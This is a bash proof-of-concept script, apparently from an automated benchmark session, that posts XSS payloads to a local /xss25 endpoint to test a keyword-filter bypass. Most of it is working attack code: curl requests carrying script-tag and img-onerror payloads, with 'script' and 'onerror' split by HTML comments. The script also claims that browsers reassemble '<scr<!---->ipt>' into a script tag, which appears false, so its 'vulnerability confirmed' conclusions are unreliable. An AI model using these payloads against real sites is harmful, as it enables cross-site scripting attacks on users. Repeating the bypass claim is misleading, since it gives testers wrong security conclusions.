#!/bin/bash
# POC: Demonstrates XSS filter bypass using HTML comments to split the 'script' keyword. The filter blocks 'script' as a continuous string but misses it when split with <!---->.
# Target: ./repo
# Created: 2025-11-06T19:29:32.236Z
# Session: benchmark-XBEN-004-24-mhnt8bw2

# HTML Comment XSS Bypass POC
# This script tests if the /xss25 endpoint can be bypassed using HTML comments
# to split blocked keywords like 'script'

TARGET="http://localhost:5000/xss25"

echo "=========================================="
echo "HTML Comment XSS Filter Bypass POC"
echo "=========================================="
echo ""

# Test 1: Direct script tag (should be filtered)
echo "[*] Test 1: Direct <script> tag (should be blocked)"
RESPONSE1=$(curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'solution=<script>alert(1)</script>')

if echo "$RESPONSE1" | grep -q "<script>"; then
    echo "[+] VULNERABLE: Direct <script> tag found in response"
    echo "[!] Response contains: $(echo "$RESPONSE1" | grep -o '<script>[^<]*</script>')"
else
    echo "[-] Direct <script> tag was filtered"
fi
echo ""

# Test 2: HTML comment bypass - split script keyword
echo "[*] Test 2: HTML comment bypass <scr<!---->ipt> (bypasses filter)"
RESPONSE2=$(curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'solution=<scr<!---->ipt>alert(1)</scr<!---->ipt>')

if echo "$RESPONSE2" | grep -q "<scr<!---->ipt>"; then
    echo "[+] VULNERABLE: HTML comment bypass payload found in response!"
    echo "[!] Response contains: $(echo "$RESPONSE2" | grep -o '<scr<!---->ipt>[^<]*</scr<!---->ipt>')"
    echo "[!] Browser will parse this as <script>alert(1)</script>"
    BYPASS_SUCCESS=1
else
    echo "[-] HTML comment bypass was filtered"
    BYPASS_SUCCESS=0
fi
echo ""

# Test 3: Verify the injection is in a value attribute (DOM location check)
echo "[*] Test 3: Checking if payload is reflected in HTML response"
if echo "$RESPONSE2" | grep -q "scr<!---->ipt"; then
    echo "[+] Payload is reflected in the HTML response"
    # Extract the relevant portion
    PAYLOAD_LOCATION=$(echo "$RESPONSE2" | grep -o 'value="[^"]*scr<!---->ipt[^"]*"' | head -1)
    if [ -n "$PAYLOAD_LOCATION" ]; then
        echo "[+] Found in input value attribute: $PAYLOAD_LOCATION"
    else
        echo "[+] Found in HTML (checking other locations)"
        echo "$RESPONSE2" | grep -o '<scr<!---->ipt>[^<]*</scr<!---->ipt>' | head -1
    fi
else
    echo "[-] Payload not found in response"
fi
echo ""

# Test 4: Alternative bypass - split 'onerror' keyword
echo "[*] Test 4: Testing alternative bypass - split 'onerror' keyword"
RESPONSE3=$(curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'solution=<img src=x on<!---->error=alert(1)>')

if echo "$RESPONSE3" | grep -q "on<!---->error"; then
    echo "[+] VULNERABLE: Alternative bypass found - 'onerror' split with comments"
    echo "[!] This demonstrates the filter is universally bypassable"
else
    echo "[-] Alternative bypass was filtered"
fi
echo ""

# Summary
echo "=========================================="
if [ $BYPASS_SUCCESS -eq 1 ]; then
    echo "[+] VULNERABILITY CONFIRMED"
    echo "[+] Filter can be bypassed using HTML comment injection"
    echo "[+] Attack vector: Split blocked keywords with <!-- and --> comments"
    echo "[+] Browser will ignore comments and execute the JavaScript"
    exit 0
else
    echo "[-] Vulnerability could not be confirmed"
    exit 1
fi